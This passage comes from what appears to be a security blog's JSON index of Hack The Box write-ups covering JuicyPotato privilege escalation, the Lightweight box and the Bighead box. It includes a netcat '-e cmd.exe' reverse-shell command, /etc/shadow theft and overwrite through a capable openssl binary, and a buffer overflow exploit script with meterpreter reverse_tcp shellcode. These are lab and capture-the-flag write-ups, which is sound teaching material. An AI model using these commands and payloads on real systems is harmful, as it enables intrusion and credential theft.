check the https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md site for a list of CLSID for the OS.We’ll use {8BC3F05E-D86B-11D0-A075-00C04FB68820}, for no particular reason then execute JuicyPotato and run another netcat to spawn a new reverse shell for us.C:\\inetpub\\wwwroot\\upload&gt;juicypotato.exe -l 1234 -p nc.exe -a \"-e cmd.exe 10.10.14.23 443\" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}juicypotato.exe -l 1234 -p nc.exe -a \"-e cmd.exe 10.10.14.23 443\" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 1234......[+] authresult 0{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\\SYSTEM[+] CreateProcessWithTokenW OKC:\\inetpub\\wwwroot\\upload&gt;And… we get a shell back as NT AUTHORITY\\SYSTEM:# nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.116] 49709Microsoft Windows [Version 10.0.15063](c) 2017 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamint authority\\systemC:\\Windows\\system32&gt;type c:\\users\\administrator\\desktop\\proof.txttype c:\\users\\administrator\\desktop\\proof.txt5737DD..."
  },
  
  {
    "title": "Lightweight - Hack The Box",
    "url": "/posts/htb-writeup-lightweight/",
    "categories": "hackthebox, infosec",
    "tags": "john, ldap, caps, tcpdump, password cracking",
    "date": "2019-05-11 00:00:00 +0800",
    





    
    "snippet": "Lightweight was a fun box that uses Linux capabilities set on tcpdump so we can capture packets on the loopback interface and find credentials in an LDAP session. We then find more credentials in t...",
    "content": "Lightweight was a fun box that uses Linux capabilities set on tcpdump so we can capture packets on the loopback interface and find credentials in an LDAP session. We then find more credentials in the source code of the web application and finally priv esc to root by abusing a copy of the openssl program that all has Linux caps set on it.Summary  The main web page contains instructions on how to access the box by SSH (basically an account is automatically created based on the user’s IP address)  The status.php page does an LDAP query to the loopback interface, which can be intercepted since tcpdump is running with elevated caps  The LDAP query contains the credentials for user ldapuser2  User ldapuser2 has access to the PHP source code for the web application, which has credentials for user ldapuser1  There is an openssl binary in the home directory of ldapuser1 with elevated caps that let us read/write any files on the systemPortscanWe got SSH, Apache httpd and OpenLDAP runnning on this box.root@ragingunicorn:~# nmap -sC -sV -p- 10.10.10.119Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-10 23:27 ESTNmap scan report for 10.10.10.119Host is up (0.024s latency).Not shown: 65532 filtered portsPORT    STATE SERVICE VERSION22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: |   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16|_http-title: Lightweight slider evaluation page - slendr389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X| ssl-cert: Subject: commonName=lightweight.htb| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain| Not valid before: 2018-06-09T13:32:51|_Not valid after:  2019-06-09T13:32:51|_ssl-date: TLS randomness does not represent timeWeb pageThere’s not much on the webpage except some instructions on how to login via SSH, how to reset the user password and a status check page.One thing to note is the status page always take a long time to execute so there is probably some script running in the background.As per the instruction, we can log in with our IP as username / password:# ssh -l 10.10.14.23 10.10.10.11910.10.14.23@10.10.10.119's password: [10.10.14.23@lightweight ~]$ iduid=1004(10.10.14.23) gid=1004(10.10.14.23) groups=1004(10.10.14.23) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023LDAP enumThe LDAP server allows any user to search the directory and does not require authentication:# ldapsearch -h 10.10.10.119 -b \"dc=lightweight,dc=htb\" -x# ldapuser1, People, lightweight.htbdn: uid=ldapuser1,ou=People,dc=lightweight,dc=htbuid: ldapuser1cn: ldapuser1sn: ldapuser1mail: ldapuser1@lightweight.htbobjectClass: personobjectClass: organizationalPersonobjectClass: inetOrgPersonobjectClass: posixAccountobjectClass: topobjectClass: shadowAccountuserPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQvshadowLastChange: 17691shadowMin: 0shadowMax: 99999shadowWarning: 7loginShell: /bin/bashuidNumber: 1000gidNumber: 1000homeDirectory: /home/ldapuser1# ldapuser2, People, lightweight.htbdn: uid=ldapuser2,ou=People,dc=lightweight,dc=htbuid: ldapuser2cn: ldapuser2sn: ldapuser2mail: ldapuser2@lightweight.htbobjectClass: personobjectClass: organizationalPersonobjectClass: inetOrgPersonobjectClass: posixAccountobjectClass: topobjectClass: shadowAccountuserPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24xshadowLastChange: 17691shadowMin: 0shadowMax: 99999shadowWarning: 7loginShell: /bin/bashuidNumber: 1001gidNumber: 1001homeDirectory: /home/ldapuser2We can see two sets of credentials here. These are actually Base64 encoded versions of the Linux SHA512 hashes.First hash decodes to: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/None of the hashes could be cracked using rockyou.txt, so we have to get the password some other way.Checking capsI checked the entire filesystem for any files running with elevated capabilities. Capabilities are used when a program need some kind of privilege that would normally require root access. With caps, we can give specific privileges to the binary without making the file suid or running it directly as root.[10.10.14.23@lightweight ~]$ getcap -r / 2&gt;/dev/null/usr/bin/ping = cap_net_admin,cap_net_raw+p/usr/sbin/mtr = cap_net_raw+ep/usr/sbin/suexec = cap_setgid,cap_setuid+ep/usr/sbin/arping = cap_net_raw+p/usr/sbin/clockdiff = cap_net_raw+p/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+epHere, tcpdump has some caps set to allow a regular user to capture traffic on any interface.As per http://man7.org/linux/man-pages/man7/capabilities.7.html, the exact description of the caps are:CAP_NET_ADMIN    Perform various network-related operations:    * interface configuration;    * administration of IP firewall, masquerading, and accounting;    * modify routing tables;    * bind to any address for transparent proxying;    * set type-of-service (TOS)    * clear driver statistics;    * set promiscuous mode;    * enabling multicasting;CAP_NET_RAW    * Use RAW and PACKET sockets;    * bind to any address for transparent proxying.Capturing trafficThere is an automated script on the box that connects locally to the LDAP server via the loopback interface. Because it’s not using LDAPS, the credentials are in plaintext and I can capture them by sniffing the loopback interface.[10.10.14.23@lightweight ~]$ tcpdump -nni lo -w /tmp/capture.pcaptcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytesAfter grabbing the .pcap file via scp, we can see the following LDAP query using simple authentication with user ldapuser2And we’ve got the password in plaintext here:ldapuser2 password is: 8bc8251332abe1d7f105d3e53ad39ac2Logging in as ldapuser2 and grabbing the user flagWe can’t SSH in as ldapuser2 but we’re able to su to ldapuser2.[10.10.14.23@lightweight ~]$ su -l ldapuser2Password: Last login: Mon Dec 10 21:41:37 GMT 2018 on pts/1Last failed login: Tue Dec 11 04:35:22 GMT 2018 from 10.10.14.23 on ssh:nottyThere was 1 failed login attempt since the last successful login.[ldapuser2@lightweight ~]$ lsbackup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt[ldapuser2@lightweight ~]$ cat user.txt8a866d...Privesc to ldapuser1The backup.7z file in ldapuser2’s home directory is our next logical target, however it has a password set on it:# 7z e backup.7z 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz (206A7),ASM,AES-NI)Scanning the drive for archives:1 file, 3411 bytes (4 KiB)Extracting archive: backup.7z--Path = backup.7zType = 7zPhysical Size = 3411Headers Size = 259Method = LZMA2:12k 7zAESSolid = +Blocks = 1    Enter password (will not be echoed):I’ll use 7z2john to extract the hash then crack it with john:root@ragingunicorn:~/JohnTheRipper/run# ./7z2john.pl /root/tmp/backup.7z backup.7z:$7z$2$19$0$$8$11e96[...]# ~/JohnTheRipper/run/john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-70.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (7z, 7-Zip [SHA256 128/128 AVX 4x AES])Cost 1 (iteration count) is 524288 for all loaded hashesCost 2 (padding size) is 12 for all loaded hashesCost 3 (compression type) is 2 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusdelete           (?)1g 0:00:00:40 DONE (2018-12-10 23:59) 0.02448g/s 50.53p/s 50.53c/s 50.53C/s poison..nokiaUse the \"--show\" option to display all of the cracked passwords reliablySession completedPassword is : delete# 7z x -obackup backup.7z 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21[...]Size:       10270Compressed: 3411root@ragingunicorn:~/tmp# ls -l backuptotal 24-rw-r----- 1 root root 4218 Jun 13 14:48 index.php-rw-r----- 1 root root 1764 Jun 13 14:47 info.php-rw-r----- 1 root root  360 Jun 10  2018 reset.php-rw-r----- 1 root root 2400 Jun 14 15:06 status.php-rw-r----- 1 root root 1528 Jun 13 14:47 user.phpWe have a backup of the web application source code and status.php contains credentials:$username = 'ldapuser1';$password = 'f3ca9d298a553da117442deeb6fa932d';We can then su to ldapuser1 with that password:[10.10.14.23@lightweight ~]$ su -l ldapuser1Password: Last login: Tue Dec 11 02:01:07 GMT 2018 on pts/1[ldapuser1@lightweight ~]$ ls capture.pcap  ldapTLS.php  openssl  tcpdumpFinal privescChecking caps again, we see the openssl binary in the current directory has caps set:[ldapuser1@lightweight ~]$ getcap -r / 2&gt;/dev/null/usr/bin/ping = cap_net_admin,cap_net_raw+p/usr/sbin/mtr = cap_net_raw+ep/usr/sbin/suexec = cap_setgid,cap_setuid+ep/usr/sbin/arping = cap_net_raw+p/usr/sbin/clockdiff = cap_net_raw+p/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep/home/ldapuser1/openssl =epThe =ep caps means the all capabilities are assigned to the file. We can read /etc/shadow with openssl by encrypting it to a file in our home directory, then decrypting it:-256-cbc encryption password:Verifying - enter aes-256-cbc encryption password:[ldapuser1@lightweight ~]$ ./openssl aes-256-cbc -d -a -in shadow.enc -out shadowenter aes-256-cbc decryption password:[ldapuser1@lightweight ~]$ cat shadowroot:$6$eVOz8tJs$xpjymy5BFFeCIHq9a.BoKZeyPReKd7pwoXnxFNOa7TP5ltNmSDsiyuS/ZqTgAGNEbx5jyZpCnbf8xIJ0Po6N8.:17711:0:99999:7:::[...]ldapuser1:$6$OZfv1n9[v$2gh4EFIrLW5hZEEzrVn4i8bYfXMyiPp2450odPwiL5yGOHYksVd8dCTqeDt3ffgmwmRYw49c]MFueNZNOoI6A1.:17691:365:99999:7:::ldapuser2:$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1:17691:365:99999:7:::10.10.14.2:clJFBL7EDs1H6:17851:0:99999:7:::10.10.14.13:qehr2qxjyEzkw:17874:0:99999:7:::10.10.14.26:syd74YenpBuf6:17875:0:99999:7:::10.10.14.12:pdfLwDAqvvWI2:17876:0:99999:7:::10.10.14.23:owYEfkaBVoeFI:17876:0:99999:7:::We probably can’t crack the root hash because the HTB boxes typically have a very complex password for the root account but we can replace the shadow file with an empty root password:[ldapuser1@lightweight ~]$ ./openssl aes-256-cbc -a -salt -in shadow -out shadow.encenter aes-256-cbc encryption password:Verifying - enter aes-256-cbc encryption password:[ldapuser1@lightweight ~]$ ./openssl aes-256-cbc -d -a -in shadow.enc -out /etc/shadowenter aes-256-cbc decryption password:[ldapuser1@lightweight ~]$ su -l rootLast login: Thu Dec  6 14:09:41 GMT 2018 on tty1[root@lightweight ~]# iduid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023[root@lightweight ~]# cat root.txtf1d4e3..."
  },
  
  {
    "title": "Bighead - Hack The Box",
    "url": "/posts/htb-writeup-bighead/",
    "categories": "hackthebox, infosec",
    "tags": "exploit development, egghunter, asm, nginx, php, keepass, lfi, ntfs ads, enumeration, insane, windows",
    "date": "2019-05-04 00:00:00 +0800",
    





    
    "snippet": "Bighead was an extremely difficult box by 3mrgnc3 that starts with website enumeration to find two sub-domains and determine there is a custom webserver software running behind an Nginx proxy. We t...",
    "content": "Bighead was an extremely difficult box by 3mrgnc3 that starts with website enumeration to find two sub-domains and determine there is a custom webserver software running behind an Nginx proxy. We then need to exploit a buffer overflow in the HEAD requests by creating a custom exploit. After getting a shell, there’s some pivoting involved to access a limited SSH server, then an LFI to finally get a shell as SYSTEM. For the final stretch there is an NTFS alternate data stream with a Keepass file that contains the final flag.This box took the big part of my weekend when it came out but unfortunately I didn’t keep detailed notes about everything. It was especially hard going back when doing this writeup and remember about the 418 status code and the registry key for the SSH password. Note to self: Always clean-up my notes after doing a box.The exploit part is especially tricky since there isn’t a lot of buffer space to work with so I had to put my second stage payload in memory first with a POST request then use an egghunter for the first stage payload. There’s also another way to exploit this software without using an egghunter: We can use the LoadLibrary function to remotely load a .dll from our machine over SMB. I’ll try to cover both in this blog post.Summary  Find the code.bighead.htb sub-domain after dirbusting the main website  Enumerate code.bighead.htb, find reference to dev.bighead.htb in one of the note file  Find the BigheadWebSvr 1.0 webserver running by checking the coffee directory  Search github and find that we can download the source code for the BigheadWebSvr webserver  Analyse the binary and determine that it is vulnerable to a buffer overflow in HEAD requests  Develop a working exploit locally on a 32 bits Windows 7 machine  Adapt the exploit so it works through the Nginx reverse proxy  Get a working reverse shell with the exploit and a metepreter payload  Find a local SSH service listening on port 2020 then set up port forwarding to reach it  Find the nginx SSH credentials by looking in the registry then log in to bvshell  Find an LFI vulnerability in the Testlink application then use it to get a shell as NT AUTHORITY\\SYSTEM  Get the user.txt flag and find that the root.txt is accessible but contains a troll  Notice that Keepass is installed and that the configuration file contains a keyfile name and database file of root.txt  Find that there is an NTFS alternate data stream in the root.txt file that contains the hidden Keepass database file  Download the admin.png keyfile, extract the hidden stream, extract the hash from the database file and crack it with John The Ripper  Open the Keepass database file with the keyfile and password, then recover the root.txt hash from the databaseTools used  Immunity Debugger &amp; x96dbg  Metasploit  keepass2john  John The RipperPortscanThere’s a single port open and Nginx is listening on it:# nmap -sC -sV -p- 10.10.10.112Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-28 21:03 EDTNmap scan report for bighead.htb (10.10.10.112)Host is up (0.0076s latency).Not shown: 65534 filtered portsPORT   STATE SERVICE VERSION80/tcp open  http    nginx 1.14.0|_http-server-header: nginx/1.14.0|_http-title: PiperNet ComesWebsite enumeration: bighead.htbThe main website is a company front page with a contact form at the bottom.I tried checking the contact form for any stored XSS but I couldn’t find any.A quick scan with gobuster reveals interesting directories: /backend and /updatecheck# gobuster -q -w /usr/share/wordlists/dirb/big.txt -t 50 -u http://bighead.htb/.htpasswd (Status: 403)/.htaccess (Status: 403)/Images (Status: 301)/assets (Status: 301)/backend (Status: 302)/images (Status: 301)/updatecheck (Status: 302)backend simply redirects to http://bighead.htb/BigHead and returns a 404 error.However /updatecheck redirects to http://code.bighead.htb/phpmyadmin/phpinfo.php, so I’ll add that sub-domain to the list of stuff to enumerate.After adding the sub-domain I can get to the page and it returns a phpinfo() output.I know the box is running Windows Server 2008 and that it’s 32 bits.Website enumeration: code.bighead.htbIf I try to browse http://code.bighead.htb/ I’m redirected to http://code.bighead.htb/testlink/ which has another javascript redirect script to http://127.0.0.1:5080/testlink/.Further enumeration with gobuster:# gobuster -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 25 -u http://code.bighead.htb | grep -vi index2018/11/24 14:54:15 Starting gobuster/images (Status: 301)/img (Status: 301)/assets (Status: 301)/mail (Status: 301)/dev (Status: 301)/phpmyadmin (Status: 301)/webalizer (Status: 301)/dashboard (Status: 301)/xampp (Status: 301)/licenses (Status: 301)/server-status (Status: 200)/con (Status: 403)/aux (Status: 403)/error_log (Status: 403)/prn (Status: 403)/server-info (Status: 200)A couple interesting directories like phpmyadmin, dashboard and xampp but the apps are broken by design and I can’t do anything with them. I got some info about the server architecture from http://code.bighead.htb/server-info?config but that’s about it:Server Version: Apache/2.4.33 (Win32) OpenSSL/1.0.2o PHP/5.6.36Server Architecture: 32-bitIt’s interesting to note that the initial nmap scan found Nginx running on port 80 but here I have Apache running. That means Nginx is probably acting as a reverse proxy or load-balancer in front of Apache.Next, I enumerated the /testlink directory I found earlier and got the following:# gobuster -q -w /usr/share/wordlists/dirb/big.txt -t 50 -u http://code.bighead.htb/testlink -s 200/LICENSE (Status: 200)/ChangeLog (Status: 200)/Index (Status: 200)/changelog (Status: 200)/error (Status: 200)/index (Status: 200)/license (Status: 200)/linkto (Status: 200)/note (Status: 200)/plugin (Status: 200)[...]The note file is very interesting as it contains a hint:BIGHEAD! You F%*#ing R*#@*d!STAY IN YOUR OWN DEV SUB!!!...You have literally broken the code testing app and tools I spent all night building for Richard!I don't want to see you in my code again!Dinesh.So Bighead broke the app and Dinesh is telling him to get his own DEV sub-domain, maybe I should check if dev.bighead.htb exists…So after adding this sub-domain to the local hostfile, I can access a new page:Website enumeration: dev.bighead.htbAnything that has the word blog and wp-content in it hits an nginx rule and returns a false positive for anything that contains that. I didn’t find anything when I ran gobuster but dirb found the /coffee directory because it looks for more status codes by default.# dirb http://dev.bighead.htbGENERATED WORDS: 4612---- Scanning URL: http://dev.bighead.htb/ ----+ http://dev.bighead.htb/blog (CODE:302|SIZE:161)+ http://dev.bighead.htb/blog_ajax (CODE:302|SIZE:161)+ http://dev.bighead.htb/blog_inlinemod (CODE:302|SIZE:161)+ http://dev.bighead.htb/blog_report (CODE:302|SIZE:161)+ http://dev.bighead.htb/blog_search (CODE:302|SIZE:161)+ http://dev.bighead.htb/blog_usercp (CODE:302|SIZE:161)+ http://dev.bighead.htb/blogger (CODE:302|SIZE:161)+ http://dev.bighead.htb/bloggers (CODE:302|SIZE:161)+ http://dev.bighead.htb/blogindex (CODE:302|SIZE:161)+ http://dev.bighead.htb/blogs (CODE:302|SIZE:161)+ http://dev.bighead.htb/blogspot (CODE:302|SIZE:161)+ http://dev.bighead.htb/coffee (CODE:418|SIZE:46)+ http://dev.bighead.htb/wp-content (CODE:302|SIZE:161)The /coffee directory contains a funny teapot 418 error message.I also see it’s running a different webserver: BigheadWebSvr 1.0# curl --head dev.bighead.htb/coffeeHTTP/1.1 200 OKDate: Tue, 27 Nov 2018 02:20:48 GMTContent-Type: text/htmlContent-Length: 13456Connection: keep-aliveServer: BigheadWebSvr 1.0Google shows a github repository for that software: https://github.com/3mrgnc3/BigheadWebSvrI download BHWS_Backup.zip and saw that the zip file was encrypted. I can extract the hash and crack it with John:# zip2john BHWS_Backup.zip &gt; hash.txtBHWS_Backup.zip-&gt;BHWS_Backup/ is not encrypted!BHWS_Backup.zip-&gt;BHWS_Backup/conf/ is not encrypted!# cat hash.txtBHWS_Backup.zip:$zip2$*0*3*0*231ffea3729caa2f37a865b0dca373d7*d63f*49*61c6e7d2949fb22573c57dec460346954bba23dffb11f1204d4a6bc10e91b4559a6b984884fcb376ea1e2925b127b5f6721c4ef486c481738b94f08ac09df30c30d2ae3eb8032c586f*28c1b9eb8b0e1769b4d3*$/zip2$:::::BHWS_Backup.zip# john -w=/usr/share/wordlists/rockyou.txt --fork=4 hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])Node numbers 1-4 of 4 (fork)Press 'q' or Ctrl-C to abort, almost any other key for status2 0g 0:00:00:00 DONE (2018-11-26 21:41) 0g/s 0p/s 0c/s 0C/s3 0g 0:00:00:00 DONE (2018-11-26 21:41) 0g/s 0p/s 0c/s 0C/s4 0g 0:00:00:00 DONE (2018-11-26 21:41) 0g/s 0p/s 0c/s 0C/sthepiedpiper89   (BHWS_Backup.zip)1 1g 0:00:00:00 DONE (2018-11-26 21:41) 100.0g/s 100.0p/s 100.0c/s 100.0C/s thepiedpiper89Waiting for 3 children to terminateUse the \"--show\" option to display all of the cracked passwords reliablySession completedPassword is : thepiedpiper89The archive contains the following files:-rw-r--r-- 1 root root   75 Jul 14  2018 BigheadWebSvr_exe_NOTICE.txtdrwx------ 2 root root 4096 Jul  2  2018 conf-rw-r--r-- 1 root root 1103 Jun 23  2018 fastcgi.conf-rw-r--r-- 1 root root 1032 Jun 23  2018 fastcgi_params-rw-r--r-- 1 root root 2946 Jun 23  2018 koi-utf-rw-r--r-- 1 root root 2326 Jun 23  2018 koi-win-rw-r--r-- 1 root root 5265 Jun 23  2018 mime.types-rw-r--r-- 1 root root 4523 Jul  2  2018 nginx.conf-rw-r--r-- 1 root root  653 Jun 23  2018 scgi_params-rw-r--r-- 1 root root  681 Jun 23  2018 uwsgi_params-rw-r--r-- 1 root root 3736 Jun 23  2018 win-utfThe .exe in the archive was replaced with a note instead:# cat BigheadWebSvr_exe_NOTICE.txtI removed this vulnerable crapware from the archiveloveGilfoyle... :DThe file history on Github shows an older copy of the zip file:I downloaded the file then tried to extract it but the password is not thepiedpiper89. I cracked the password again and found the older commit uses bighead as the archive password. After extracting the file I can see there is a BigheadWebSvr.exe binary in there instead of the note.# ls -ltotal 132-rw-r--r-- 1 root root 28540 Jul  2 16:33 bHeadSvr.dlldrwx------ 2 root root  4096 Jul  2 19:56 BHWS_Backup-rw-r--r-- 1 root root 51431 Jul  2 16:33 BigheadWebSvr.exedrwx------ 2 root root  4096 Jul  2 19:57 conf-rw-r--r-- 1 root root  1103 Jun 23 11:50 fastcgi.conf-rw-r--r-- 1 root root  1032 Jun 23 11:50 fastcgi_params-rw-r--r-- 1 root root  2946 Jun 23 11:50 koi-utf-rw-r--r-- 1 root root  2326 Jun 23 11:50 koi-win-rw-r--r-- 1 root root  5265 Jun 23 11:50 mime.types-rw-r--r-- 1 root root  4523 Jul  2 15:34 nginx.conf-rw-r--r-- 1 root root   653 Jun 23 11:50 scgi_params-rw-r--r-- 1 root root   681 Jun 23 11:50 uwsgi_params-rw-r--r-- 1 root root  3736 Jun 23 11:50 win-utf# file BigheadWebSvr.exe BigheadWebSvr.exe: PE32 executable (console) Intel 80386, for MS WindowsThere is also an nginx config file which shows the following interesting stuff:location / {\t\t\t# Backend server to forward requests to/from\t\t\tproxy_pass          http://127.0.0.1:8008;\t\t\tproxy_cache_convert_head off;\t\t\tproxy_cache_key $scheme$proxy_host$request_uri$request_method;\t\t\tproxy_http_version  1.1;\t\t\t\t\t\t# adds gzip\t\t\tgzip_static on;\t\t\t\t}location /coffee {\t\t\t# Backend server to forward requests to/from\t\t\t#rewrite /coffee /teapot/ redirect;\t\t\t#return 418;\t\t\tproxy_pass          http://127.0.0.1:8008;\t\t\tproxy_cache_convert_head off;\t\t\tproxy_intercept_errors off;\t\t\tproxy_cache_key $scheme$proxy_host$request_uri$request_method;\t\t\tproxy_http_version  1.1;\t\t\tproxy_pass_header Server;\t\t\t# adds gzip\t\t\tgzip_static on;\t\t\t\t}So, both requests to / and /coffee on dev.bighead.htb are served by that crap custom webserver but only /coffee reveals the server header because of the proxy_pass_header Server config file.Exploit development (Method #1 using egghunter)After opening the .exe file in IDA Free, I saw that the binary was compiled with Mingw. From what I googled, none of the protections like DEP/NX are enabled by default when compiling with mingw so that should make exploitation easier.The main function sets up up the socket listener and creates a ConnectionHandler thread when it receives a connection:The ConnectionHandler has multiple branches for the different HTTP methods. The HEAD request calls the Function4 function.The function uses an insecure strcpy to move data around so it’s possible there is a buffer overflow.I used the open-source x32/64dbg debugger to debug the software.I setup a breakpoint at the end of Function4 just before it returns.First, I test with a small payload that should not crash the server just to see if it catches the breakpoint and what the memory layout looks like.curl --head http://172.23.10.186:8008/AAAAAAAAAAAAAAThe program stops at the breakpoint and EAX contains the memory address where the HEAD request is located.The memory at 0x175FB28 contains part of the HEAD request.Next, I try sending 100 bytes and see if I can crash the program.curl --head http://172.23.10.186:8008/$(python -c 'print \"A\"*100')The program crashes, and I can see that the EIP register was overwritten by AAAAAAAA which is not a valid address here.Next I have to find the exact amount of data to push to overwrite EIP. After I few minutes I was able to find the exact offset:curl --head http://172.23.10.186:8008/$(python -c 'print((\"A\"*72)+(\"B\"*8))')I used mona in Immunity Debugger to confirm that no protection are enabled on BigheadWebSvr.exeNow I need to redirect the execution of the program to the EAX register value since this is where my payload will be located. I will use mona to look for gadgets in the program that I can use to jump to. Specifically, I’m looking for the memory address of a JMP EAX instruction.I found a gadget at address 0x625012f2 in the bHeadSvr.dll. No protection is enabled on this DLL.To test, I’ll replace BBBBBBBB from my payload with the memory address of the JMP EAX. Notice the address is in the reverse order to respect the endianess.curl --head http://172.23.10.186:8008/$(python -c 'print((\"A\"*72)+(\"f2125062\"))')After the function returns, the EIP points to the JMP EAX instruction.Then it jumps to the memory address of EAX. We see here we only have 36 bytes of buffer space to work with.I’ll align the stack first by pushing and popping the EAX value into ESP. To find the opcode for this I used nasm_shell.rb from Metasploit:# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb nasm &gt; push eax00000000  50                push eaxnasm &gt; pop esp00000000  5C                pop espEdit: In retrospect I don’t this part was required for this exploit, the exploit should have worked anyways because it doesn’t push/pop stuff off the stack.Since I don’t have much buffer space to work with I’ll use a 32 bytes egghunter. Basically the egghunter is a small shellcode that looks for a marker (the egg) in memory and jumps to it when it finds it. This is the first stage of the exploit, the 2nd stage will be the rest of the shellcode we want to execute and we’ll need to place it in memory with another HTTP request. Mona can generate the code for the egghunter. By default it uses the string w00t for the egg.The first stage payload is:  Align stack  Egghunter shellcode  JMP EAXThe second stage payload is:  w00tw00t (egg)  meterpreter payloadThe exploit tested locally on my Win7 VM is shown here:#!/usr/bin/pythonfrom pwn import *'''# msfvenom -p windows/meterpreter/reverse_tcp -b \\x00\\x0a\\x0d -f python LHOST=172.23.10.39 LPORT=80[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 11 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 368 (iteration=0)x86/shikata_ga_nai chosen with final size 368Payload size: 368 bytesFinal size of python file: 1772 bytes'''egg = \"\\x77\\x30\\x30\\x74\" # w00tpayload = egg + eggpayload += \"\\xbf\\x33\\x30\\xf9\\x54\\xdd\\xc2\\xd9\\x74\\x24\\xf4\\x5a\\x29\"payload += \"\\xc9\\xb1\\x56\\x31\\x7a\\x13\\x83\\xea\\xfc\\x03\\x7a\\x3c\\xd2\"payload += \"\\x0c\\xa8\\xaa\\x90\\xef\\x51\\x2a\\xf5\\x66\\xb4\\x1b\\x35\\x1c\"payload += \"\\xbc\\x0b\\x85\\x56\\x90\\xa7\\x6e\\x3a\\x01\\x3c\\x02\\x93\\x26\"payload += \"\\xf5\\xa9\\xc5\\x09\\x06\\x81\\x36\\x0b\\x84\\xd8\\x6a\\xeb\\xb5\"payload += \"\\x12\\x7f\\xea\\xf2\\x4f\\x72\\xbe\\xab\\x04\\x21\\x2f\\xd8\\x51\"payload += \"\\xfa\\xc4\\x92\\x74\\x7a\\x38\\x62\\x76\\xab\\xef\\xf9\\x21\\x6b\"payload += \"\\x11\\x2e\\x5a\\x22\\x09\\x33\\x67\\xfc\\xa2\\x87\\x13\\xff\\x62\"payload += \"\\xd6\\xdc\\xac\\x4a\\xd7\\x2e\\xac\\x8b\\xdf\\xd0\\xdb\\xe5\\x1c\"payload += \"\\x6c\\xdc\\x31\\x5f\\xaa\\x69\\xa2\\xc7\\x39\\xc9\\x0e\\xf6\\xee\"payload += \"\\x8c\\xc5\\xf4\\x5b\\xda\\x82\\x18\\x5d\\x0f\\xb9\\x24\\xd6\\xae\"payload += \"\\x6e\\xad\\xac\\x94\\xaa\\xf6\\x77\\xb4\\xeb\\x52\\xd9\\xc9\\xec\"payload += \"\\x3d\\x86\\x6f\\x66\\xd3\\xd3\\x1d\\x25\\xbb\\x10\\x2c\\xd6\\x3b\"payload += \"\\x3f\\x27\\xa5\\x09\\xe0\\x93\\x21\\x21\\x69\\x3a\\xb5\\x30\\x7d\"payload += \"\\xbd\\x69\\xfa\\xee\\x43\\x8a\\xfa\\x27\\x80\\xde\\xaa\\x5f\\x21\"payload += \"\\x5f\\x21\\xa0\\xce\\x8a\\xdf\\xaa\\x58\\x99\\x08\\xa1\\xbf\\x89\"payload += \"\\x34\\xb5\\xbf\\x19\\xb1\\x53\\xef\\xc9\\x91\\xcb\\x50\\xba\\x51\"payload += \"\\xbc\\x38\\xd0\\x5e\\xe3\\x59\\xdb\\xb5\\x8c\\xf0\\x34\\x63\\xe4\"payload += \"\\x6c\\xac\\x2e\\x7e\\x0c\\x31\\xe5\\xfa\\x0e\\xb9\\x0f\\xfa\\xc1\"payload += 